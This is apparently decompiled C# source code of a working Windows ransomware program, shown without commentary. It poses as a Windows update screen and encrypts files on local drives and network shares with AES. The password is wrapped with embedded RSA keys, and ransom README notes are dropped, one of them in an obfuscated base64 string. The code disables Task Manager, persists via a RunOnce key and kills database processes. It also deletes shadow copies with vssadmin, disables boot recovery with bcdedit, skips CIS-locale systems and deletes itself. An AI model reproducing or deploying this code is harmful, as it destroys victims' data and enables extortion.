using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Trinet.Networking;
using osilokinom.Properties;

namespace osilokinom;

public class Form1 : Form
{
	private const int keySize = 2048;

	private DriveInfo[] Drives = DriveInfo.GetDrives();

	private string finalransomwalue = RandomRansom(7);

	private string computerName = Environment.MachineName.ToString();

	private string userName = Environment.UserName;

	private string userNameG = Guid.NewGuid().ToString();

	private string result_filename;

	private string version = "blpo";

	private DateTime nowTime = DateTime.Now;

	private string finalcountry;

	private static bool OAEP = false;

	private string publicKey;

	private string encryptedPassword;

	private static Encoding enc8 = Encoding.UTF8;

	private string pathbackup = Path.GetTempPath() + "backup//";

	private string[] base_ex = new string[72]
	{
		".mdf", ".db", ".mdb", ".sql", ".pdb", ".pdb", ".pdb", ".dsk", ".fp3", ".fdb",
		".accdb", ".dbf", ".crd", ".db3", ".dbk", ".nsf", ".gdb", ".abs", ".sdb", ".sdb",
		".sdb", ".sqlitedb", ".edb", ".sdf", ".sqlite", ".dbs", ".cdb", ".cdb", ".cdb", ".bib",
		".dbc", ".usr", ".dbt", ".rsd", ".myd", ".pdm", ".ndf", ".ask", ".udb", ".ns2",
		".kdb", ".ddl", ".sqlite3", ".odb", ".ib", ".db2", ".rdb", ".wdb", ".tcx", ".emd",
		".sbf", ".accdr", ".dta", ".rpd", ".btr", ".vdb", ".daf", ".dbv", ".fcd", ".accde",
		".mrg", ".nv2", ".pan", ".dnc", ".dxl", ".tdt", ".accdc", ".eco", ".fmp", ".vpd",
		".his", ".fid"
	};

	private bool _closeoff = true;

	private int numfile;

	private string[] words = new string[1] { ".lnk" };

	private string password = CreatePassword(32);

	private string encryptedPasswordw;

	private string zencryptedPassword;

	private string zencryptedPasswordw;

	private IContainer components;

	private Label label1;

	private string getsysteminfo => CultureInfo.CurrentCulture.Name;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		Random random = new Random();
		int millisecondsTimeout = random.Next(5000, 10000);
		Thread.Sleep(millisecondsTimeout);
		InitializeComponent();
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void fornewthread()
	{
		Random random = new Random();
		int millisecondsTimeout = random.Next(5000, 20000);
		Thread.Sleep(millisecondsTimeout);
		go();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = _closeoff;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		int num = 0;
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (!process.ProcessName.Contains(processName))
			{
				continue;
			}
			num++;
			if (num > 1)
			{
				try
				{
					Environment.Exit(0);
					((Form)this).Close();
					Application.Exit();
				}
				catch
				{
				}
			}
		}
		((Control)this).set_BackColor(ColorTranslator.FromHtml("#07466c"));
		updating();
		Thread thread = new Thread(fornewthread);
		thread.Start();
	}

	public void go()
	{
		string[] source = new string[9] { "ru", "be", "uk", "kk", "ky", "hy", "ka", "tt", "uz" };
		string text = getsysteminfo;
		string value = TruncateLongString(text, 2);
		if (source.Contains(value))
		{
			SelfDelete();
			Environment.Exit(0);
			((Form)this).Close();
			Application.Exit();
		}
		string winName = GetWinName();
		string processName = Process.GetCurrentProcess().ProcessName;
		string s = string.Concat(text, "_", finalransomwalue, "_", userName, "_", nowTime, "_", winName, "_", version, "_", processName);
		KillCtrlAltDelete();
		Autorun();
		publicKey = "<RSAKeyValue><Modulus>xrNBUKvy0kb5DDWR2xhgiE5nMr+VWEO87HfqNsdCtklmErdoD8tR8rJ4iGRlZ/TpMcERFpikiBXooPa6SKkF5bVf8BacPBhhsuUwR6DGIGC8gLsGZUg2gqXnSY9HufITyr150rGmyi0vvVxSwrctaGd85UaWDREB8NZgS+kFCoP1/CyuiE13JFkAkCAkQCE/mvyGuIcrpiokJKyMZrjKkoVQHwecERDWBHtdShqsTSmUXPjYl2EO0jPdfK4X64d94r/DQgLATqyRCiJtILp8Fwgu9vtO3sZdrh+a88jDQ76S+cM5BELb+WlfHvnvx0iq3UW55HPLSMQnk90Yh4IINQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		encryptedPassword = EncryptTextRSA(password, 2048, publicKey);
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		finalcountry = Convert.ToBase64String(bytes);
		encryptedPassword = encryptedPassword + "&" + finalcountry;
		Keyback(finalransomwalue, password, finalcountry);
		DriveInfo[] drives = Drives;
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				lockdir(driveInfo.RootDirectory.ToString(), password, words);
			}
			catch (IOException)
			{
			}
		}
		Network(password, words);
		Slite();
		KillAutorun();
		password = null;
		DelBack();
		_closeoff = false;
		((Form)this).Close();
		SelfDelete();
		Application.Exit();
	}

	public static string TruncateLongString(string inputString, int maxChars)
	{
		if (maxChars <= 0)
		{
			throw new ArgumentOutOfRangeException("maxChars");
		}
		if (inputString != null && inputString.Length >= maxChars)
		{
			return inputString.Substring(0, maxChars);
		}
		return inputString;
	}

	public static int GetInt(RNGCryptoServiceProvider rnd, int max)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			rnd.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while (num >= max * (int.MaxValue / max));
		return num % max;
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
		{
			while (length-- > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[GetInt(rnd, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	public static string RandomRansom(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
		{
			while (length-- > 0)
			{
				stringBuilder.Append("1234567890"[GetInt(rnd, "1234567890".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	private void Network(string password, string[] words)
	{
		try
		{
			NetworkBrowser networkBrowser = new NetworkBrowser();
			foreach (string networkComputer in networkBrowser.getNetworkComputers())
			{
				if (networkComputer == null || networkComputer.Trim().Length <= 0)
				{
					continue;
				}
				ShareCollection shares = ShareCollection.GetShares(networkComputer);
				if (shares == null)
				{
					continue;
				}
				foreach (Share item in shares)
				{
					if (item.ShareType != 0)
					{
						continue;
					}
					string text2 = item.ToString();
					if (Enumerable.Contains(text2, '\\'))
					{
						if (password == "reset")
						{
							lockdir(text2, "reset", words);
						}
						else
						{
							lockdir(text2, password, words);
						}
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void DisplayMessageBoxText(string info)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(info);
	}

	public byte[] AES_Encrypt1(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Padding = PaddingMode.None;
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public byte[] AES_Encrypt2(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public void lockdir(string location, string password, string[] words)
	{
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		if (location.Contains("WINDOWS") || location.Contains("RECYCLER") || location.Contains("Program Files") || location.Contains("Program Files (x86)") || location.Contains("Windows") || location.Contains("Recycle.Bin") || location.Contains("RECYCLE.BIN") || location.Contains("Recycler") || location.Contains("TEMP") || location.Contains("APPDATA") || location.Contains("AppData") || location.Contains("Temp") || location.Contains("ProgramData") || location.Contains("Microsoft") || location.Contains("Burn"))
		{
			return;
		}
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				string extension = Path.GetExtension(files[i]);
				string text = null;
				using (FileStream fileStream = File.Open(files[i], FileMode.Open, FileAccess.Read))
				{
					byte[] array = new byte[10];
					fileStream.Position = fileStream.Length - array.Length;
					fileStream.Read(array, 0, array.Length);
					text = enc8.GetString(array);
				}
				if (words.Contains(extension))
				{
					continue;
				}
				if (files[i].Contains("README_"))
				{
					if (!(password == "reset"))
					{
						continue;
					}
					try
					{
						string text2 = File.ReadAllText(files[i]);
						string[] separator = new string[10] { ",", ".", "!", "?", ";", ":", " ", "\r\n", "\r", "\n" };
						string[] array2 = text2.Split(separator, StringSplitOptions.RemoveEmptyEntries);
						string[] array3 = array2;
						foreach (string text3 in array3)
						{
							int length = text3.Length;
							if (length > 341)
							{
								zencryptedPassword = text3;
							}
						}
						if (!zencryptedPassword.Contains("##"))
						{
							int num = files[i].IndexOf("README_");
							string text4 = files[i].Substring(num + 7);
							string text5 = text4.Replace(".txt", "");
							zencryptedPasswordw = File.ReadAllText(Path.GetTempPath() + text5 + "_dat.log");
							if (!string.IsNullOrEmpty(zencryptedPasswordw))
							{
								File.WriteAllText(files[i], string.Empty);
								string text6 = "SGVsbG*hIEFsbCB%b#VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB-ZWQuLi_NCg-KWW(!ciBwZXJzb@%hbCBJZDoNCiR^ZW%jcnlwdGVkUGFzc#dvcmR#IyMkbnVtZmlsZQ-KDQpUbyBkZWNyeXB-IHlvdXIgZmlsZXMgeW(!IG%lZWQgdG*gaW%zdGFsbCB-b#IgYnJvd#NlciwgeW(!IGNhbiBkb#dubG(hZCBpdCBoZXJlOiBodHRwczovL#d#dy%-b#Jwcm(qZWN-Lm(yZy(kb#dubG(hZC(kb#dubG(hZC%odG!sLmVuIA-KQWZ-ZXIgaW%zdGFsbGF-aW(uLCBvcGVuIHRoZSB-b#IgYnJvd#NlciB-byB#ZWJzaXRlOiBodHRwOi*vdjd%ZHZlNG!rYW*@YzZ-bS%vbmlvbiBvciBodHRwOi*vbmhhcWRpa@hqNGFlaWdrZS%vbmlvbiBhbmQgZm(sbG(#IHRoZSBpbnN-cnVjdGlvbnMuDQoNCkRvIG%vdCB-cnkgcmVzdG(yZSBmaWxlcyB#aXRob#V-IG(!ciBoZWxwLCB-aGlzIGlzIHVzZWxlc#MsIGFuZCBjYW_gZGVzdHJveSB%b#UgZGF-YSBwZXJtYW%ldGx%Lg-KSG(#ZXZlciwgdGhlIGZpbGVzIGNhbiBiZSByZWNvdmVyZWQgZXZlbiBhZnRlciB-aGUgcmVtb#ZhbCBvZiBvdXIgcHJvZ#JhbSBhbmQgZXZlbiBhZnRlcg-KcmVpbnN-YWxsaW%nIHRoZSBvcGVyYXRpbmcgc#lzdGVtLg))";
								string s = text6.Replace("!", "1").Replace("@", "2").Replace("#", "3")
									.Replace("_", "4")
									.Replace("%", "5")
									.Replace("^", "6")
									.Replace("&", "7")
									.Replace("*", "8")
									.Replace("(", "9")
									.Replace(")", "=")
									.Replace("-", "0");
								byte[] bytes = Convert.FromBase64String(s);
								string @string = Encoding.UTF8.GetString(bytes);
								@string = @string.Replace("$zencryptedPasswordw", zencryptedPasswordw);
								string s2 = numfile.ToString();
								string newValue = Convert.ToBase64String(Encoding.UTF8.GetBytes(s2));
								@string = @string.Replace("$numfile", newValue);
								File.WriteAllText(files[i], @string, Encoding.UTF8);
							}
						}
					}
					catch (Exception)
					{
					}
					continue;
				}
				if (text.Contains("###"))
				{
					string value = text.Replace("###", "");
					try
					{
						Convert.ToInt32(value);
					}
					catch (Exception)
					{
						if (!(password == "reset"))
						{
							LockFile(files[i], password);
						}
					}
				}
				else if (!(password == "reset"))
				{
					LockFile(files[i], password);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
		for (int k = 0; k < directories.Length; k++)
		{
			try
			{
				if (password == "reset")
				{
					lockdir(directories[k], "reset", words);
					continue;
				}
				lockdir(directories[k], password, words);
				WriteInfo(directories[k], password);
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
	}

	public void LockFile(string file, string password)
	{
		checkTask();
		numfile++;
		FileInfo fileInfo = new FileInfo(file);
		long length = fileInfo.Length;
		string extension = Path.GetExtension(file);
		if (length >= 1048576L && !base_ex.Contains(extension))
		{
			AES_Encrypt(file, password);
			return;
		}
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt2(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		result_filename = Path.GetFileName(file);
		byte[] bytes3 = Encoding.UTF8.GetBytes(result_filename);
		string text = Convert.ToBase64String(bytes3);
		string directoryName = fileInfo.DirectoryName;
		byte[] bytes4 = Encoding.Default.GetBytes("###" + finalransomwalue);
		using (FileStream fileStream = new FileStream(file, FileMode.Append, FileAccess.Write))
		{
			fileStream.Write(bytes4, 0, bytes4.Length);
			fileStream.Flush();
			fileStream.Close();
		}
		File.Move(file, directoryName + "/" + text);
	}

	public void AES_Encrypt(string file, string password)
	{
		byte[] array = new byte[1048576];
		try
		{
			using FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
			fileStream.Read(array, 0, array.Length);
			fileStream.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
		try
		{
			using FileStream fileStream2 = new FileStream(file, FileMode.Open, FileAccess.Write);
			byte[] bytesToBeEncrypted = array;
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] array2 = AES_Encrypt1(bytesToBeEncrypted, bytes);
			fileStream2.Write(array2, 0, array2.Length);
			fileStream2.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
		FileInfo fileInfo = new FileInfo(file);
		result_filename = Path.GetFileName(file);
		byte[] bytes2 = Encoding.UTF8.GetBytes(result_filename);
		string text = Convert.ToBase64String(bytes2);
		string directoryName = fileInfo.DirectoryName;
		byte[] bytes3 = Encoding.Default.GetBytes("###" + finalransomwalue);
		using (FileStream fileStream3 = new FileStream(file, FileMode.Append, FileAccess.Write))
		{
			fileStream3.Write(bytes3, 0, bytes3.Length);
			fileStream3.Flush();
			fileStream3.Close();
		}
		File.Move(file, directoryName + "/" + text);
	}

	public void WriteInfo(string path, string password)
	{
		string tt = Resources.tt;
		byte[] bytes = Encoding.Default.GetBytes(tt);
		tt = Encoding.UTF8.GetString(bytes);
		tt = tt.Replace("$encryptedPassword", encryptedPassword);
		File.WriteAllText(path + "\\README_" + finalransomwalue + ".txt", tt, Encoding.UTF8);
	}

	public void Slite()
	{
		string[] source = new string[47]
		{
			"ar-SA", "ar-AE", "nl-BE", "nl-NL", "en-GB", "en-US", "en-CA", "en-AU", "en-NZ", "fr-BE",
			"fr-CH", "fr-FR", "fr-CA", "fr-LU", "de-AT", "de-DE", "de-CH", "it-CH", "it-IT", "ko-KR",
			"pt-PT", "es-ES", "sv-FI", "sv-SE", "bg-BG", "ca-ES", "cs-CZ", "da-DK", "el-GR", "en-IE",
			"et-EE", "eu-ES", "fi-FI", "hu-HU", "ja-JP", "lt-LT", "nn-NO", "pl-PL", "ro-RO", "se-FI",
			"se-NO", "se-SE", "sk-SK", "sl-SI", "sv-FI", "sv-SE", "tr-TR"
		};
		string value = getsysteminfo;
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Disk\\Enum");
		string text = (string)registryKey.GetValue("0");
		registryKey.Close();
		if (text.Contains("VBOX") || text.Contains("Virtual") || text.Contains("VMware") || Pro() == "good" || !source.Contains(value) || numfile <= 5000)
		{
			return;
		}
		DriveInfo[] drives = Drives;
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				lockdir(driveInfo.RootDirectory.ToString(), "reset", words);
			}
			catch (IOException)
			{
			}
		}
		Network("reset", words);
	}

	private static string Pro()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName.Contains("VBox") || process.ProcessName.Contains("prl_") || process.ProcessName.Contains("srvc.exe") || process.ProcessName.Contains("vmtoolsd"))
			{
				try
				{
					return "good";
				}
				catch (Exception)
				{
				}
			}
		}
		return "Null";
	}

	private static string GetWinName()
	{
		string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		if (registryKey != null)
		{
			try
			{
				string text = registryKey.GetValue("ProductName")!.ToString();
				if (text == "")
				{
					return "null";
				}
				if (text.Contains("XP"))
				{
					return "XP";
				}
				if (text.Contains("7"))
				{
					return "Win 7";
				}
				if (text.Contains("2003"))
				{
					return "Serv 2003";
				}
				if (text.Contains("8"))
				{
					if (text.Contains("2008"))
					{
						return "Serv 2008";
					}
					return "Win 8";
				}
				if (text.Contains("10"))
				{
					return "Win 10";
				}
				if (text.Contains("11"))
				{
					return "Win 11";
				}
				if (text.Contains("2012"))
				{
					return "Serv 2012";
				}
				if (text.Contains("2016"))
				{
					return "Serv 2016";
				}
				if (text.Contains("2019"))
				{
					return "Serv 2019";
				}
				if (text.Contains("2022"))
				{
					return "Serv 2022";
				}
				if (text.Contains("Server"))
				{
					return "Serv";
				}
				return "Unknow";
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}
		return "Null";
	}

	public void Keyback(string finalransomwalue, string password, string finalcountry)
	{
		string text = "<RSAKeyValue><Modulus>vhmMf1lRw5KH1+HMYj39f15c0VNUo1NPJllMQRIH06yeUAH6m4ca1LdMAQLgZ75mqP3vRXWYgKdNsJgNQgmehOnBUK7XP4z2PdzbiOvYsBp0RYfs9Zjl72Z4FDRqg6kpN7PJpj4+o0MWuy9zvEQNUqUvpLjn+MaiDfLVCKN9yA3/q1AmSL0lNzRolYsykKDZS3H5xelknP6oqSxjHb5bzs7Vh8xcYDSRETCwjxBduSgdfq1JQ3mcEJORAQA5FabhhtBnk/OYRmyWD7TMs9kYAaMOB+z/SkSHsj+7f9oyx1I9JX64gV9EUAcN0JKTKj5OVvubTVnAHZ4lCkWx8OOSbw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		string text2 = "<RSAKeyValue><Modulus>1lJJP6yjJ3DTj5kEjKbpaf2FUwwf64fL79zTeGjudy4lRO3FBYGG9upuE3kmIeSp8hImEfnS5zasBl1jZUdGU+2PzxpXxwVu2VZuIg4NLt6mi+YloKD2ktKoJig79dV45/Q/NJFXqn85HnyIfq9SMU73xOSAxLbjDf6AJP2qy9qbSABM5Ru2cDMFAk5zWxMzkL2cDJWcRDjGPJMGc/2vmSq1EqU1Hkh7H14BALVNZiU/RlrylonkG8F7bDrsf4khYIvy3Fjhd1RzXPWatYZ8QIG4hVR7+a1xB2xSw4PYdkWZzapG5TV9tdVsbOPqX2YnVNUC78up7BNJ2f6oGD98QQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		string text3 = "<RSAKeyValue><Modulus>mIQGhVh6BsMy9VtgYx0PeSn4HsWtP7LoxukEidvPenuEMC2fGc6AZb+tZ62E6Z8YzZo8OKsT4EwGx0RJUoB9byzn/DvVktGIhWoeYIz0nzVBOMyrXKn5QiaPW4ZP+a4xQoA0GzVnRwe7+HjiYiWY357EX7PHujaU6mvLe/bVRIoY7QHKzUvmQZohY6qj/bMdJXF6YbDw9/gXXqEnCz4LQNG6/Z4SjNv6vc7YU1V4aT1Jdl2sIufpAocVZeNdqV0c/Qrh/TIVhod9okGod7DwFFYZ6NmknNYTpsZVBSISyZllNkjmwDA0OMI0p+LNFvBubWqe6Vj71kdER8h+T+x4Xw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		Random random = new Random();
		string[] array = new string[3] { text, text2, text3 };
		int num = random.Next(0, 2);
		string text4 = EncryptTextRSA(password, 2048, array[num]);
		text4 = text4 + "&" + finalcountry + "&" + num;
		File.WriteAllText(Path.GetTempPath() + finalransomwalue + "_dat.log", text4);
	}

	public void KillCtrlAltDelete()
	{
		string value = "1";
		string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue("DisableTaskMgr", value);
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	public static string EncryptTextRSA(string text, int keySize, string publicKeyXml)
	{
		byte[] inArray = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml);
		return Convert.ToBase64String(inArray);
	}

	public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKeyXml)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
		rSACryptoServiceProvider.FromXmlString(publicKeyXml);
		return rSACryptoServiceProvider.Encrypt(data, OAEP);
	}

	public void Autorun()
	{
		string text = Path.GetTempPath() + "Adobe//";
		try
		{
			if (!Directory.Exists(pathbackup))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(text);
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			}
		}
		catch
		{
		}
		string location = Assembly.GetExecutingAssembly().Location;
		string fileName = Path.GetFileName(location);
		try
		{
			File.Copy(location, Path.Combine(text, fileName), overwrite: false);
		}
		catch
		{
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\");
		string text2 = Path.GetTempPath() + "Adobe";
		registryKey.SetValue(fileName, text2 + "\\" + fileName);
		registryKey.Close();
	}

	public void KillAutorun()
	{
		string name = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce";
		string location = Assembly.GetExecutingAssembly().Location;
		string fileName = Path.GetFileName(location);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			if (registryKey != null)
			{
				registryKey.DeleteValue(fileName);
				Registry.CurrentUser.DeleteSubKey(fileName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string path = Path.GetTempPath() + "Adobe\\";
			Directory.Delete(path, recursive: true);
		}
		catch (Exception)
		{
		}
	}

	public void updating()
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		int timeinstall = 1;
		((Control)label1).set_Text("Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + timeinstall + "% complete" + Environment.NewLine + "Do not turn off your computer.");
		Timer val = new Timer();
		val.set_Interval(100000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			timeinstall++;
			if (timeinstall < 100)
			{
				((Control)label1).set_Text("Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + timeinstall + "% complete" + Environment.NewLine + "Do not turn off your computer.");
			}
		});
		val2.Start();
	}

	private void checkTask()
	{
		List<string> list = new List<string>();
		list.Add("taskmgr");
		list.Add("sqlagent");
		list.Add("winword");
		list.Add("sqlbrowser");
		list.Add("sqlservr");
		list.Add("sqlwriter");
		list.Add("oracle");
		list.Add("ocssd");
		list.Add("dbsnmp");
		list.Add("synctime");
		list.Add("mydesktopqos");
		list.Add("agntsvc.exeisqlplussvc");
		list.Add("xfssvccon");
		list.Add("mydesktopservice");
		list.Add("ocautoupds");
		list.Add("agntsvc.exeagntsvc");
		list.Add("agntsvc.exeencsvc");
		list.Add("firefoxconfig");
		list.Add("tbirdconfig");
		list.Add("ocomm");
		list.Add("mysqld");
		list.Add("sql");
		list.Add("mysqld-nt");
		list.Add("mysqld-opt");
		list.Add("dbeng50");
		list.Add("sqbcoreservice");
		List<string> list2 = list;
		Process[] processes = Process.GetProcesses();
		try
		{
			Process[] array = processes;
			foreach (Process process in array)
			{
				foreach (string item in list2)
				{
					if (process.ProcessName.ToLower().Contains(item.ToLower()))
					{
						process.Kill();
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void SelfDelete()
	{
		string executablePath = Application.get_ExecutablePath();
		StreamWriter streamWriter = new StreamWriter("update.bat");
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine("ping -n 1 -w 5000 10.10.254.254 >nul");
		streamWriter.WriteLine("del \"" + executablePath + "\"");
		streamWriter.WriteLine("del %0");
		streamWriter.Close();
		Process.Start("update.bat");
		Application.Exit();
	}

	public void DelBack()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "delback.bat");
		string contents = "vssadmin delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
		File.WriteAllText(text, contents, Encoding.Default);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = text;
		if (!flag)
		{
			try
			{
				Process.Start(processStartInfo);
				return;
			}
			catch (Win32Exception)
			{
				return;
			}
		}
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_Anchor((AnchorStyles)15);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Segoe UI Light", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		label1.set_Image((Image)(object)Resources.win8_spinner);
		((Control)label1).set_Location(new Point(417, 278));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(362, 106));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("\"Multi-line \\r\\nlabel\"");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label1).set_UseWaitCursor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_AutoSize(true);
		((Form)this).set_ClientSize(new Size(1264, 681));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Control)this).set_UseWaitCursor(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
